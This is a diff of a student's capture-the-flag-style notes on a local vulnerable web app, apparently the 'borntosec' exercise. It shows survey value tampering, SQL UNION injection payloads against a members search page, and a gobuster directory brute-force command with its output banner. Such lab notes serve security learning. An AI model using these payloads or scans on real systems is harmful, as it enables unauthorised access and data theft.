@@ -6,9 +6,12 @@ The server assumes the values as being from 1 to 10, but you can send the reques
 http://localhost:13080/?page=survey
 Inspect option of Ben
 Change value to 11 (negative didn't work)
-03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA
 
 ### Flag 01 (WIP)
+
+Search members page queries the database directly using SQL
+
+vulnerable to sql injections we assume
 
 5 UNION SELECT COUNT(_), NULL FROM users --
 5 UNION SELECT COUNT(_), first_name FROM users --
@@ -151,6 +154,7 @@ Url : borntosec.ddns.net/images.png
 
 ➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975
 
+```
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -178,7 +182,5 @@ Progress: 20469 / 20470 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
-```
 
 ```
